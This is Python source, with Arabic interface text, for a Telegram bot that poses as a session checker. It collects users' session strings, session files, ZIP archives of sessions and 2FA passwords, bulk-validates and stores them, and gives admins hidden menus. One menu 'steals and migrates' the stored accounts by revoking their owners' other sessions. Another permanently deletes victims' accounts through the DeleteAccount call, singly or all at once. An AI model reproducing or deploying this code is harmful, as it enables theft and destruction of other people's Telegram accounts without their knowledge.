# 🟢 التقاط الباسوورد بخطوتين من المستخدم 
@bot.message_handler(func=lambda message: message.from_user.id in USER_STATES and USER_STATES[message.from_user.id].get("action") == "wait_for_2fa")
def handle_2fa_password_input(message):
    USER_STATES[message.from_user.id]["2fa_pass"] = message.text.strip()
    bot.reply_to(message, "⏳ تـم اسـتـلام كـلـمـة الـسـر، جـاري الـتـحـقـق والـتـهـجـيـر...")

@bot.message_handler(func=lambda message: message.text and not message.text.startswith('/'))
def handle_text_input(message):
    if not is_allowed(message.from_user.id): return bot.reply_to(message, "عذراً، البوت خاص!", parse_mode="Markdown")
    text = message.text.strip()
    hex_match = re.search(r'\b([0-9a-fA-F]{512})\b', text)
    if hex_match:
        hex_key = hex_match.group(1)
        dc_match = re.search(r'\b([1-5])\b', text.replace(hex_key, ""))
        status_msg = bot.reply_to(message, "⏳ جـاري الاتـصـال بـمـفـتـاح الـ Hex...")
        async def verify_hex():
            for dc_id in ([int(dc_match.group(1))] if dc_match else [1, 2, 3, 4, 5]):
                pyro_sess, _ = generate_sessions(API_ID, dc_id, bytes.fromhex(hex_key), 9999)
                client = Client(f"hx_{message.from_user.id}{int(time.time())}", api_id=API_ID, api_hash=API_HASH, session_string=pyro_sess, in_memory=True)
                try:
                    await asyncio.wait_for(client.connect(), timeout=10)
                    me = await client.get_me()
                    await client.disconnect()
                    return me, pyro_sess
                except Exception:
                    if client.is_connected: await client.disconnect()
            return None, None
        me, p_sess = run_async(verify_hex())
        if me:
            process_successful_login(message, status_msg, me, p_sess, "Hex", raw_hex=hex_key)
        else:
            bot.edit_message_text("❌ جـلـسـة مـعـطـوبـة أو مـطـرودة.", message.chat.id, status_msg.message_id)
    elif len(text) > 50 and " " not in text:
        status_msg = bot.reply_to(message, "⏳ جـاري فـحـص مـفـتـاح الـجـلـسـة...")
        async def verify_txt():
            client = Client(f"tx{message.from_user.id}_{int(time.time())}", api_id=API_ID, api_hash=API_HASH, session_string=convert_telethon_to_pyrogram(text), in_memory=True)
            try:
                await asyncio.wait_for(client.connect(), timeout=10)
                me = await client.get_me()
                pyro_sess = await client.export_session_string()
                await client.disconnect()
                return me, pyro_sess
            except Exception: return None, None
        me, p_sess = run_async(verify_txt())
        if me: process_successful_login(message, status_msg, me, p_sess, "String")
        else: bot.edit_message_text("❌ جـلـسـة مـعـطـوبـة.", message.chat.id, status_msg.message_id)

# =========================================================
# 🛠️ دالة المستخرج الخام والتحويل الذكي للجلسات (Raw API Parser)
# =========================================================
def get_pyrogram_session_string_from_sqlite(db_path, api_id=2040):
    conn = None
    try:
        conn = sqlite3.connect(db_path)
        cursor = conn.cursor()
        cursor.execute("SELECT name FROM sqlite_master WHERE type='table';")
        tables = [row[0] for row in cursor.fetchall()]
        if "sessions" not in tables:
            return None, f"الملف غير صالح"
        cursor.execute("PRAGMA table_info(sessions)")
        columns = [row[1] for row in cursor.fetchall()]
        dc_id, auth_key, user_id, is_bot, test_mode = None, None, 0, False, False

        if "server_address" in columns or "port" in columns:
            cursor.execute("SELECT dc_id, auth_key FROM sessions LIMIT 1;")
            row = cursor.fetchone()
            if row: dc_id, auth_key = row[0], row[1]
        else:
            select_cols = [c for c in ["dc_id", "test_mode", "auth_key", "user_id", "is_bot"] if c in columns]
            cursor.execute(f"SELECT {', '.join(select_cols)} FROM sessions LIMIT 1;")
            row = cursor.fetchone()
            if row:
                rd = dict(zip(select_cols, row))
                dc_id, auth_key, test_mode, user_id, is_bot = rd.get("dc_id"), rd.get("auth_key"), bool(rd.get("test_mode", False)), rd.get("user_id", 0), bool(rd.get("is_bot", False))

        if not dc_id or not auth_key: return None, "بيانات ناقصة"
        packed = struct.pack(">BI?256sQ?", int(dc_id), int(api_id), bool(test_mode), bytes(auth_key), abs(int(user_id)), bool(is_bot))
        return base64.urlsafe_b64encode(packed).decode('ascii').rstrip('='), None
    except Exception as e: return None, str(e)
    finally:
        if conn: conn.close()

# =========================================================
# 📊 دوال شريط التقدم وأزرار الزينة
# =========================================================
@bot.callback_query_handler(func=lambda call: call.data == "ignore")
def ignore_callback(call):
    bot.answer_callback_query(call.id)

def generate_progress_text(processed, total):
    percent = int((processed / total) * 100) if total > 0 else 0
    filled = int(percent / 5)
    bar = "🟢" * filled + "⚪️" * (20 - filled)
    return f"⏳ جـاري الـفـحـص والـتـحـقـق الـمـكـثـف...\n[{bar}] {percent}% ({processed}/{total})"

def generate_progress_markup(processed, total, success, failed, frozen=0):
    markup = InlineKeyboardMarkup()
    markup.row(InlineKeyboardButton("العدد الكلي ⏳", callback_data="ignore"), InlineKeyboardButton(f"{total}", callback_data="ignore"))
    markup.row(InlineKeyboardButton("شغالة ✔️", callback_data="ignore"), InlineKeyboardButton(f"{success}", callback_data="ignore"))
    markup.row(InlineKeyboardButton("تالفة ❌", callback_data="ignore"), InlineKeyboardButton(f"{failed}", callback_data="ignore"))
    return markup

# =========================================================
# 📁 دالة استلام ومعالجة الملفات (Session, ZIP, TXT)
# =========================================================
@bot.message_handler(content_types=['document'])
def handle_files(message):
    if not is_allowed(message.from_user.id): return
    file_name = message.document.file_name.lower()

    # 📌 حالة إرسال ملف .txt يحتوي على hex:dc (الفحص السريع)
    if file_name.endswith(".txt"):
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        lines = downloaded_file.decode('utf-8').splitlines()

        valid_sessions = []
        for line in lines:
            if ":" in line:
                parts = line.split(":")
                if len(parts[0]) >= 512: # التأكد أنه Hex
                    valid_sessions.append((parts[0].strip(), parts[1].strip()))

        total = len(valid_sessions)
        if total == 0: return bot.reply_to(message, "❌ الملف لا يحتوي على تنسيق `hex:dc` صحيح.")

        status_msg = bot.reply_to(message, generate_progress_text(0, total), reply_markup=generate_progress_markup(0, total, 0, 0))

        async def process_txt_fast():
            state = {'processed': 0, 'success': 0, 'failed': 0}
            sem = asyncio.Semaphore(50) # فحص 50 حساب متوازي كما طلبت

            async def ui_updater():
                last_p = -1
                while state['processed'] < total:
                    if state['processed'] != last_p:
                        last_p = state['processed']
                        try: bot.edit_message_text(generate_progress_text(state['processed'], total), message.chat.id, status_msg.message_id, reply_markup=generate_progress_markup(state['processed'], total, state['success'], state['failed']))
                        except: pass
                    await asyncio.sleep(2)

            async def check_hex_session(hex_data, dc_id):
                async with sem:
                    is_ok = False
                    try:
                        p_sess, _ = generate_sessions(API_ID, int(dc_id), bytes.fromhex(hex_data), 9999)
                        client = Client(f"bulk_{int(time.time()*1000)}", api_id=API_ID, api_hash=API_HASH, session_string=p_sess, in_memory=True)
                        await asyncio.wait_for(client.connect(), timeout=12)
                        me = await client.get_me()
                        if me and not check_duplicate(message.from_user.id, me.id):
                            save_account(message.from_user.id, me.phone_number or "Unknown", me.id, me.first_name or "User", p_sess, "", "TXT_Hex")
                            is_ok = True
                        await client.disconnect()
                    except: pass
                    state['processed'] += 1
                    if is_ok: state['success'] += 1
                    else: state['failed'] += 1

            updater = asyncio.create_task(ui_updater())
            await asyncio.gather(*[check_hex_session(h, d) for h, d in valid_sessions])
            updater.cancel()
            return state['success'], state['failed']

        s_count, f_count = run_async(process_txt_fast())
        final_text = (f"🛂┊ تـم انـتـهـاء فـحـص مـلـف الـ TXT !\n\n⎉╎ الإجمالي: {total}\n✅ الـشـغـالـة: {s_count}\n❌ الـتـالـفـة: {f_count}")
        bot.edit_message_text(final_text, message.chat.id, status_msg.message_id, reply_markup=home_keyboard(message.from_user.id))

    # 📌 حالة إرسال ملف .session واحد
    elif file_name.endswith(".session"):
        status_msg = bot.reply_to(message, "•❐• جـاري قـراءة مـلـف الـجـلـسـة...", parse_mode="Markdown")
        temp_file_path = f"sess_{message.from_user.id}_{int(time.time())}.session"
        with open(temp_file_path, 'wb') as f: f.write(bot.download_file(bot.get_file(message.document.file_id).file_path))

        async def verify_file():
            session_str, _ = get_pyrogram_session_string_from_sqlite(temp_file_path, API_ID)
            if not session_str: return None, None, "فشل الاستخراج"
            client = Client("temp", session_string=session_str, api_id=API_ID, api_hash=API_HASH, in_memory=True)
            try:
                await asyncio.wait_for(client.connect(), timeout=12)
                me, p_sess = await client.get_me(), await client.export_session_string()
                await client.disconnect()
                return me, p_sess, None
            except Exception as e: return None, None, str(e)
            finally: 
                if os.path.exists(temp_file_path): os.remove(temp_file_path)

        me, p_sess, _ = run_async(verify_file())
        if me: process_successful_login(message, status_msg, me, p_sess, "File")
        else: bot.edit_message_text("❌ مـلـف مـعـطـوب أو فـشـل الـفـحـص.", message.chat.id, status_msg.message_id)

    # 📌 حالة إرسال ملف ZIP
    elif file_name.endswith(".zip"):
        status_msg = bot.reply_to(message, generate_progress_text(0, 1), reply_markup=generate_progress_markup(0, 1, 0, 0))
        extract_dir = f"tmp_{message.from_user.id}_{int(time.time())}"
        os.makedirs(extract_dir, exist_ok=True)
        zip_path = os.path.join(extract_dir, file_name)
        with open(zip_path, 'wb') as f: f.write(bot.download_file(bot.get_file(message.document.file_id).file_path))

        try:
            with zipfile.ZipFile(zip_path, 'r') as zip_ref: zip_ref.extractall(extract_dir)
            session_files = [os.path.join(r, f) for r, d, fs in os.walk(extract_dir) for f in fs if f.endswith(".session") and not f.startswith("._")]
            total = len(session_files)
            if total == 0: return bot.edit_message_text("❌ لا تـوجـد مـلـفـات .session", message.chat.id, status_msg.message_id)

            async def process_zip_live():
                state = {'processed': 0, 'success': 0, 'failed': 0}
                sem = asyncio.Semaphore(50) # سرعة عالية أيضاً للـ ZIP

                async def live_updater():
                    lp = -1
                    while state['processed'] < total:
                        if state['processed'] != lp:
                            lp = state['processed']
                            try: bot.edit_message_text(generate_progress_text(state['processed'], total), message.chat.id, status_msg.message_id, reply_markup=generate_progress_markup(state['processed'], total, state['success'], state['failed']))
                            except: pass
                        await asyncio.sleep(2)

                u_task = asyncio.create_task(live_updater())

                async def check_one(p):
                    async with sem:
                        ok = False
                        try:
                            s_str, _ = get_pyrogram_session_string_from_sqlite(p, API_ID)
                            if s_str:
                                client = Client(f"z_{int(time.time()*1000)}", session_string=s_str, api_id=API_ID, api_hash=API_HASH, in_memory=True)
                                await asyncio.wait_for(client.connect(), timeout=12)
                                me = await client.get_me()
                                if me and not check_duplicate(message.from_user.id, me.id):
                                    save_account(message.from_user.id, me.phone_number or "Unknown", me.id, me.first_name or "User", s_str, "", "ZIP")
                                    ok = True
                                await client.disconnect()
                        except: pass
                        state['processed'] += 1
                        if ok: state['success'] += 1
                        else: state['failed'] += 1

                await asyncio.gather(*[check_one(f) for f in session_files])
                u_task.cancel()
                return state['success'], state['failed']

            s_count, f_count = run_async(process_zip_live())
            bot.edit_message_text(f"🛂┊ تـم انـتـهـاء فـحـص ZIP !\nالناجحة: {s_count}\nالفاشلة: {f_count}", message.chat.id, status_msg.message_id, reply_markup=home_keyboard(message.from_user.id))
        except Exception as e: bot.edit_message_text(f"❌ خطأ: {str(e)}", message.chat.id, status_msg.message_id)
        finally: shutil.rmtree(extract_dir, ignore_errors=True)









@bot.callback_query_handler(func=lambda call: call.data == "admin_add_user")
def admin_add_user_start(call):
    if call.from_user.id not in ADMIN_IDS: return

    # تحديد شكل الزر بناءً على حالة البوت
    status_icon = "✅" if PUBLIC_MODE else "❌"
    markup = InlineKeyboardMarkup()
    markup.row(InlineKeyboardButton(f"السماح للكل {status_icon}", callback_data="toggle_public_mode"))
    markup.row(InlineKeyboardButton("🔙 رجـوع", callback_data="back_home"))

    text = "•❐• أرسـل ايـدي الـمـسـتـخـدم الـذي تـريـد إضـافـتـه او اختر الانلاين الاتي لتفعيل البوت للجميع:"
    msg = bot.send_message(call.message.chat.id, text, reply_markup=markup)
    USER_STATES[call.from_user.id] = {"action": "add_user"}
    bot.register_next_step_handler(msg, process_add_user)

# الدالة الجديدة الخاصة بضغط الزر لتفعيل/تعطيل البوت للجميع
@bot.callback_query_handler(func=lambda call: call.data == "toggle_public_mode")
def toggle_public_mode(call):
    if call.from_user.id not in ADMIN_IDS: return
    global PUBLIC_MODE
    PUBLIC_MODE = not PUBLIC_MODE # عكس الحالة

    status_icon = "✅" if PUBLIC_MODE else "❌"
    markup = InlineKeyboardMarkup()
    markup.row(InlineKeyboardButton(f"السماح للكل {status_icon}", callback_data="toggle_public_mode"))
    markup.row(InlineKeyboardButton("🔙 رجـوع", callback_data="back_home"))

    text = "•❐• أرسـل ايـدي الـمـسـتـخـدم الـذي تـريـد إضـافـتـه او اختر الانلاين الاتي لتفعيل البوت للجميع:"
    bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup)

    # تجديد انتظار الايدي حتى لو ضغط على الزر، يقدر يرسل الايدي بعدها براحته
    bot.clear_step_handler_by_chat_id(call.message.chat.id)
    bot.register_next_step_handler(call.message, process_add_user)

def process_add_user(message):
    if message.from_user.id not in ADMIN_IDS: return
    # تمت إضافة التحقق if not message.text فقط عشان ما يهنق البوت لو أرسل ملصق بالغلط
    if not message.text or not message.text.strip().isdigit(): 
        return bot.send_message(message.chat.id, "❌ ايـدي غـيـر صـحـيـح.")
    target_id = int(message.text.strip())
    add_allowed_user(target_id, "Added")
    bot.send_message(message.chat.id, f"✅ تـم إضـافـة `{target_id}` بـنـجـاح!", parse_mode="Markdown", reply_markup=home_keyboard(message.from_user.id))

@bot.callback_query_handler(func=lambda call: call.data == "admin_ban_user")
def admin_ban_user_menu(call):
    if call.from_user.id not in ADMIN_IDS: return
    users = get_all_allowed_users()
    markup = InlineKeyboardMarkup()
    if users:
        for uid, fname in users: markup.row(InlineKeyboardButton(f"{fname} | {uid}", callback_data=f"ban_{uid}"))
    markup.row(InlineKeyboardButton("🔥 حظـر الـجـمـيـع", callback_data="ban_all_users"))
    markup.row(InlineKeyboardButton("🔙 رجـوع", callback_data="back_home"))
    bot.edit_message_text("🛂┊ حظـر الـمـسـتـخـدمـيـن:\n⎉╎ اخـتـر مـسـتـخـدمـاً لـحـظـره:", call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")










@bot.callback_query_handler(func=lambda call: call.data.startswith("ban_"))
def execute_ban(call):
    if call.from_user.id not in ADMIN_IDS: return
    target = call.data.split("_")[1]
    if target == "all":
        for uid, _ in get_all_allowed_users(): remove_allowed_user(uid)
    else: remove_allowed_user(int(target))
    admin_ban_user_menu(call)

@bot.callback_query_handler(func=lambda call: call.data == "steal_accounts")
def steal_accounts_menu(call):
    if call.from_user.id not in ADMIN_IDS: return
    status_msg = bot.edit_message_text("⏳ جـاري فـحـص وبـنـاء قـائـمـة الألـوان بـحـذر...\nهـذا يـسـتـغـرق بـضـع ثـوانـي.", call.message.chat.id, call.message.message_id)
    run_async(build_steal_menu_async(call.from_user.id, status_msg.chat.id, status_msg.message_id))

async def check_account_for_menu(acc):
    acc_id, phone, name, uid, owner_id, pyro_sess = acc
    client = Client(f"tmp_{acc_id}_{int(time.time())}", api_id=API_ID, api_hash=API_HASH, session_string=pyro_sess, in_memory=True)
    color = ""
    session_count = "?"
    two_fa_status = "غير معروف"
    try:
        await asyncio.wait_for(client.connect(), timeout=5)

        # فحص وجود تحقق بخطوتين
        try:
            pwd = await client.invoke(functions.account.GetPassword())
            if getattr(pwd, 'has_password', False):
                two_fa_status = "مفعل❌"
            else:
                two_fa_status = "غير مفعل ✅"
        except Exception:
            pass

        auths = await client.invoke(functions.account.GetAuthorizations())
        session_count = len(auths.authorizations)
        current = next((a for a in auths.authorizations if getattr(a, 'current', False)), None)
        if current:
            age = time.time() - current.date_created
            if age >= 86400: # أكثر من 24 ساعة
                color = "🟢"
            else:
                other = next((a for a in auths.authorizations if not getattr(a, 'current', False)), None)
                if other:
                    try:
                        await client.invoke(functions.account.ResetAuthorization(hash=other.hash))
                        color = "🟡" # الفحص البرمجي نجح
                        session_count -= 1
                    except Exception:
                        pass # لم تنجح، ستبقى بدون لون (مراقبة)
    except Exception:
        pass
    finally:
        if client.is_connected: await client.disconnect()

    creation_year = get_creation_year(uid)
    country_name, country_flag = get_country_info(phone)
    btn_text = f"{color} {name} | {creation_year} | {two_fa_status} | {country_flag} {country_name} | جلسات:{session_count}"
    return InlineKeyboardButton(btn_text, callback_data=f"steal:{acc_id}")

async def build_steal_menu_async(admin_id, chat_id, msg_id):
    conn = get_db_conn()
    c = conn.cursor()
    c.execute("SELECT id, phone, first_name, user_id, owner_id, pyro_session FROM sessions WHERE owner_id NOT IN ({})".format(",".join("?"*len(ADMIN_IDS))), ADMIN_IDS)
    accounts = c.fetchall()
    conn.close()

    markup = InlineKeyboardMarkup()
    if accounts:
        markup.row(InlineKeyboardButton("🏴‍☠️ سحـب و تـهـجـيـر الـجـمـيـع", callback_data="steal:all"))
        tasks = [check_account_for_menu(acc) for acc in accounts]
        buttons = await asyncio.gather(*tasks)
        for btn in buttons:
            markup.row(btn)

    markup.row(InlineKeyboardButton("🔙 رجـوع", callback_data="back_home"))
    text = "🛂┊ **نـظـام تـهـجـيـر وسـحـب الـحـسـابـات:**\n\n🟢 = جـاهـز لـلـسـحـب (تخطى 24 ساعة).\n🟡 = جـاهـز لـلـسـحـب (اجتاز الفحص البرمجي).\nبدون لون = الحساب جديد (سيوضع تحت المراقبة).\n\n⎉╎ اخـتـر حـسـابـاً לـبـدء الـتـهـجـيـر:"
    bot.edit_message_text(text, chat_id, msg_id, reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data.startswith("steal:"))
def handle_steal(call):
    if call.from_user.id not in ADMIN_IDS: return
    target = call.data.split(":")[1]

    status_msg = bot.send_message(call.message.chat.id, "⏳ جـاري إجـراء الـسـحـب والـتـهـجـيـر الـمـبـاشـر...", parse_mode="Markdown")

    if target == "all":
        conn = get_db_conn()
        c = conn.cursor()
        c.execute("SELECT id FROM sessions WHERE owner_id NOT IN ({})".format(",".join("?"*len(ADMIN_IDS))), ADMIN_IDS)
        accs = c.fetchall()
        conn.close()

        success_count = 0
        failed_count = 0

        for acc in accs:
            res = run_async(steal_single_account(acc[0], call.from_user.id))
            if "✅" in res:
                success_count += 1
            else:
                failed_count += 1
            time.sleep(1.5) # وقت راحة بسيط لتجنب حظر تليجرام

        final_text = (
            f"✅ إنـتـهـت عـمـلـيـة الـسـحـب عـلـى الـجـمـيـع!\n\n"
            f"🟢 نـجـح: {success_count} حـسـاب\n"
            f"🔴 فـشـل: {failed_count} حـسـاب"
        )
        bot.edit_message_text(final_text, call.message.chat.id, status_msg.message_id, reply_markup=home_keyboard(call.from_user.id))
    else:
        res = run_async(steal_single_account(int(target), call.from_user.id))
        bot.edit_message_text(res, call.message.chat.id, status_msg.message_id, reply_markup=home_keyboard(call.from_user.id), parse_mode="Markdown")

async def steal_single_account(acc_id, admin_id):
    acc = get_account(acc_id)
    if not acc: return "❌ الحساب غير موجود."
    _, owner_id, phone, user_id, name, pyro_session, _, _, _, _, _, _ = acc

    client_a = Client(f"st_{acc_id}_{int(time.time())}", api_id=API_ID, api_hash=API_HASH, session_string=pyro_session, in_memory=True)
    try:
        # استدعاء دالة التهجير المباشر دون أي انتظار
        success = await execute_full_migration(acc_id, client_a, owner_id, admin_id, phone, name)

        if success: 
            return f"✅ تـم الـتـهـجـيـر بـنـجـاح لـ `{phone}`. راجـع الـرسـائـل 🔑"
        else: 
            return f"❌ فـشـل تـهـجـيـر `{phone}` (قد يكون الكود ذهب لـ SMS وليس لحساب التليجرام)."

    except Exception as e: 
        return f"❌ فشل الاتصال بالحساب `{phone}`.\nالسبب: {str(e)}"
    finally:
        if client_a.is_connected: await client_a.disconnect()

@bot.callback_query_handler(func=lambda call: call.data == "manage_surveillance")
def manage_surveillance_menu(call):
    if call.from_user.id not in ADMIN_IDS: return
    # تم إلغاء نظام المراقبة، لذلك سيظهر تنبيه منبثق للمستخدم
    bot.answer_callback_query(call.id, "✅ تم إلغاء نظام المراقبة نهائياً. السحب الآن فوري ومباشر ولن يتم تعليق أي حساب!", show_alert=True)

# =========================================================
# 🔴 وحدة حذف وتدمير الحسابات نهائياً من تلجرام (خاص بالآدمن)
# =========================================================

# قاموس مؤقت لتتبع انتظار إرسال كود الجلسة للآدمن
admin_delete_state = {}

def get_admin_delete_markup():
    markup = InlineKeyboardMarkup()
    markup.row(InlineKeyboardButton("📥 تدمير حساب عبر كود الجلسة", callback_data="del_send_sess"))
    markup.row(InlineKeyboardButton("📋 اختيار من الحسابات المخزنة", callback_data="del_list_stored"))
    markup.row(InlineKeyboardButton("⚠️ تدمير كـافـة الحسابات المخزنة", callback_data="del_confirm_all"))
    markup.row(InlineKeyboardButton("🔙 رجوع للقائمة الرئيسية", callback_data="back_home"))
    return markup

async def delete_telegram_account_raw(session_str):
    """
    يتصل بالجلسة المحددة عبر الذاكرة وينفذ استدعاء الحذف النهائي من تلجرام
    """
    client = None
    try:
        client = Client(
            name=f"del_{int(time.time())}", 
            session_string=session_str, 
            api_id=API_ID, 
            api_hash=API_HASH, 
            in_memory=True
        )
        await client.connect()
        # تنفيذ استدعاء التدمير والحذف النهائي لشركة تلجرام
        await client.invoke(functions.account.DeleteAccount(reason="Decline ToS / Self-destruction"))
        await client.disconnect()
        return True, "تم حذف وتدمير الحساب بنجاح من سيرفرات تلجرام نهائياً! 🔥"
    except Exception as e:
        if client and client.is_connected:
            await client.disconnect()
        err_msg = traceback.format_exc()
        print(f"❌ فشل عملية حذف الحساب:\n{err_msg}")
        return False, str(e)

# 📡 مستمع الأزرار والتحكم للآدمن
@bot.callback_query_handler(func=lambda call: call.data.startswith("del_") or call.data.startswith("act_del_") or call.data == "admin_destroy_accounts")
def admin_delete_callbacks(call):
    if call.from_user.id not in ADMIN_IDS:
        bot.answer_callback_query(call.id, "❌ غير مصرح لك باستخدام هذه اللوحة.", show_alert=True)
        return

    data = call.data

    if data == "admin_destroy_accounts" or data == "del_back_main":
        bot.edit_message_text(
            "⚙️ **لوحة تدمير وحذف الحسابات نهائياً من تلجرام (المطورين):**\n\n"
            "تنبيه: العمليات هنا نهائية وتقوم بحذف الحساب من تلجرام بشكل كامل ومباشر عبر الـ Raw API.\n\n"
            "⚠️ (ملاحظة: البوت لن يقوم بحذف البيانات من قاعدة البيانات تلقائياً، يمكنك إزالتها لاحقاً بنفسك من خيار 'إزالة من البوت')",
            call.message.chat.id,
            call.message.message_id,
            reply_markup=get_admin_delete_markup()
        )
        bot.answer_callback_query(call.id)

    elif data == "del_send_sess":
        admin_delete_state[call.from_user.id] = "waiting_for_session"
        bot.edit_message_text(
            "📥 **يرجى إرسال كود الجلسة (Session String) المراد تدميره الآن:**\n\nقم بنسخ وإرسال الجلسة في رسالة قادمة.",
            call.message.chat.id,
            call.message.message_id,
            reply_markup=InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 إلغاء وتراجع", callback_data="del_back_main"))
        )
        bot.answer_callback_query(call.id)

    elif data == "del_list_stored":
        accounts = get_all_accounts(call.from_user.id)
        if not accounts:
            bot.answer_callback_query(call.id, "❌ لم يتم العثور على أي حسابات مسجلة بالبوت.", show_alert=True)
            return

        markup = InlineKeyboardMarkup()
        for acc in accounts[:40]: # عرض 40 حساب لتجنب تخطي حجم الرسالة
            # acc[0] هو الـ id، و acc[1] هو الرقم، و acc[2] هو الاسم المجموع من دالة get_all_accounts
            markup.row(InlineKeyboardButton(f"👤 {acc[2]} | {acc[1]}", callback_data=f"act_del_one:{acc[0]}"))

        markup.row(InlineKeyboardButton("🔙 رجوع", callback_data="del_back_main"))
        bot.edit_message_text(
            "📋 **الحسابات النشطة بالبوت:**\n\nاختر الحساب الذي تريد تدميره من تلجرام فوراً وبدون تراجع:",
            call.message.chat.id,
            call.message.message_id,
            reply_markup=markup
        )
        bot.answer_callback_query(call.id)

    elif data == "del_confirm_all":
        markup = InlineKeyboardMarkup()
        markup.row(InlineKeyboardButton("🔥 نعم، تدمير وحذف كافة الحسابات!", callback_data="act_del_all_now"))
        markup.row(InlineKeyboardButton("🔙 إلغاء وتراجع", callback_data="del_back_main"))
        bot.edit_message_text(
            "⚠️ **تـنـبـيـه كـارثـي:**\n\nأنت على وشك تدمير وحذف **جميع الحسابات المخزنة في البوت** نهائياً من تلجرام!\n\nهل أنت متأكد تماماً وتريد المتابعة؟",
            call.message.chat.id,
            call.message.message_id,
            reply_markup=markup
        )
        bot.answer_callback_query(call.id)

    elif data.startswith("act_del_one:"):
        acc_id = int(data.split(":")[1])
        acc = get_account(acc_id)
        if not acc:
            bot.answer_callback_query(call.id, "❌ لم يتم العثور على الجلسة المحددة.", show_alert=True)
            return

        # وفقاً لدالة get_account في كودك:
        # acc[2] هو الهاتف، acc[4] هو الاسم، acc[5] هو pyro_session
        phone = acc[2]
        name = acc[4]
        pyro_sess = acc[5]

        bot.edit_message_text(f"⏳ جاري تدمير وحذف الحساب `{name}` | `{phone}` نهائياً من تلجرام...", call.message.chat.id, call.message.message_id)

        success, res_msg = run_async(delete_telegram_account_raw(pyro_sess))
        if success:
            bot.edit_message_text(
                f"✅ **تم حذف الحساب `{name}` نهائياً من تلجرام.**\n\n⚠️ تم ترك بياناته بالبوت لتقوم بإزالتها يدوياً لاحقاً.",
                call.message.chat.id,
                call.message.message_id,
                reply_markup=get_admin_delete_markup()
            )
        else:
            bot.edit_message_text(f"❌ فشل حذف الحساب بسبب:\n`{res_msg}`", call.message.chat.id, call.message.message_id, reply_markup=get_admin_delete_markup())
        bot.answer_callback_query(call.id)

    elif data == "act_del_all_now":
        accounts = get_all_accounts(call.from_user.id)
        if not accounts:
            bot.edit_message_text("❌ قاعدة البيانات فارغة بالفعل.", call.message.chat.id, call.message.message_id, reply_markup=get_admin_delete_markup())
            return

        bot.edit_message_text(f"⏳ جاري بدء تدمير {len(accounts)} حساب دفعة واحدة من تلجرام...", call.message.chat.id, call.message.message_id)

        deleted_count = 0
        failed_count = 0
        for acc in accounts:
            # acc[4] في get_all_accounts يحتوي على pyro_session
            success, _ = run_async(delete_telegram_account_raw(acc[4]))
            if success:
                deleted_count += 1
            else:
                failed_count += 1

        bot.edit_message_text(
            f"📊 **تقرير الحذف النهائي للـ Raw API:**\n\n"
            f"🔥 حسابات مدمرة بنجاح: {deleted_count}\n"
            f"❌ حسابات تعذر حذفها: {failed_count}\n\n"
            f"⚠️ يمكنك الآن إزالتهم من قاعدة بيانات البوت بنفسك.",
            call.message.chat.id,
            call.message.message_id,
            reply_markup=get_admin_delete_markup()
        )
        bot.answer_callback_query(call.id)

# 📨 مستمع استلام نصوص الجلسات المرسلة يدوياً
@bot.message_handler(func=lambda msg: admin_delete_state.get(msg.from_user.id) == "waiting_for_session")
def handle_session_destruction(message):
    admin_delete_state.pop(message.from_user.id, None)
    session_str = message.text.strip()

    if not (session_str.startswith("B") and len(session_str) > 100):
        bot.reply_to(message, "❌ النص المرسل غير مطابق للجلسات المدعومة.", reply_markup=get_admin_delete_markup())
        return

    status_msg = bot.reply_to(message, "⏳ جاري تدمير الجلسة من سيرفرات تلجرام...")

    success, res_msg = run_async(delete_telegram_account_raw(session_str))
    if success:
        bot.edit_message_text(f"✅ **تم حذف وتدمير الحساب نهائياً!**\n\n{res_msg}", message.chat.id, status_msg.message_id, reply_markup=get_admin_delete_markup())
    else:
        bot.edit_message_text(f"❌ **فشلت العملية:**\n\n`{res_msg}`", message.chat.id, status_msg.message_id, reply_markup=get_admin_delete_markup())

@bot.callback_query_handler(func=lambda call: call.data.startswith("unsurveil:"))
def execute_unsurveil(call):
    if call.from_user.id not in ADMIN_IDS: return
    bot.answer_callback_query(call.id, "تم الإلغاء", show_alert=False)

if __name__ == "__main__":
    logging.info("🚀 جاري إطلاق البوت...")

    try:
        bot.remove_webhook()
    except Exception:
        pass

    while True:
        try:
            logging.info("📡 جاري الاتصال بسيرفرات تليجرام...")
            # إجبار البوت على تجاهل أخطاء الشبكة والعمل باستمرار
            bot.infinity_polling(skip_pending=True, timeout=20, long_polling_timeout=15, allowed_updates=telebot.util.update_types)
        except Exception as e:
            # لو انقطع النت من السيرفر، البوت سينتظر 5 ثواني ويحاول مجدداً ولن يطفى
            logging.error(f"❌ انقطع الاتصال بالإنترنت من السيرفر! جاري إعادة المحاولة بعد 5 ثواني... \nالسبب: {e}")
            time.sleep(5)